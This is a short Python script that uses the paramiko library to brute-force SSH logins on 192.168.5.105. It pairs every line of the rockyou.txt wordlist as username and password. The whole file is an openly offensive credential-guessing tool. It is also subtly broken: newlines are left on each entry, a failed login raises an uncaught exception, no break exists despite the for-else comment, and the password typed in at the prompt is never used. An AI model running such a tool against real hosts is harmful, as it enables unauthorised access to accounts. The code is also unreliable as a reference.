import paramiko
with open("rockyou.txt", "r", encoding="utf-8", errors="ignore") as f:
    lines = f.readlines()
    pwd = input("Enter your password: ")

    for i, line in enumerate(lines, start=1):
        for line2 in lines:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            ssh.connect("192.168.5.105", username=line, password=line2)
    else:
        # This runs only if the loop finished WITHOUT hitting break
        print("Password not found in the list.")

    print(f"Searched {i} lines")